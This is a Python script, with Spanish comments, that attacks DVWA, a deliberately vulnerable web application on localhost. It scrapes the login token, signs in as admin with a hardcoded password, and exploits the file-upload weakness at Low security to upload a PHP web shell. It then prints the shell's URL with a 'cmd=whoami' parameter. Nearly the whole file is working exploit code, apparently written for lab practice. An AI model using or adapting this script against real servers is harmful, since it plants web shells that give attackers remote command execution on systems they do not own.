import requests
from bs4 import BeautifulSoup

# URL base de DVWA
base_url = "http://localhost"
s = requests.Session()

# === LOGIN ===
def login():
    print("🔐 Iniciando sesión en DVWA...")
    login_page = s.get(f"{base_url}/login.php")
    soup = BeautifulSoup(login_page.text, 'html.parser')
    token_input = soup.find('input', {'name': 'user_token'})

    if not token_input:
        print("❌ No se encontró token de login.")
        exit(1)

    user_token = token_input['value']
    login_data = {
        'username': 'admin',
        'password': 'csrf12345',  # Contraseña actual del usuario
        'Login': 'Login',
        'user_token': user_token
    }

    response = s.post(f"{base_url}/login.php", data=login_data)
    if "Logout" in response.text:
        print("✅ Login exitoso.")
    else:
        print("❌ Falló el login.")
        exit(1)

# === SUBIR ARCHIVO PHP MALICIOSO ===
def subir_shell():
    print("📤 Subiendo archivo malicioso...")

    # Modo Low: sin token
    files = {
        'uploaded': ('shell.php', open('shell.php', 'rb'), 'application/octet-stream')
    }

    data = {
        'Upload': 'Upload'
    }

    r = s.post(f"{base_url}/vulnerabilities/upload/", files=files, data=data)

    if "uploaded" in r.text and "shell.php" in r.text:
        print("✅ Archivo subido con éxito.")
        print("🌐 Shell accesible en:")
        print(f"{base_url}/hackable/uploads/shell.php?cmd=whoami")
    else:
        print("❌ Falló la subida del archivo.")
        print(r.text)

# === MAIN ===
if __name__ == "__main__":
    login()
    subir_shell()
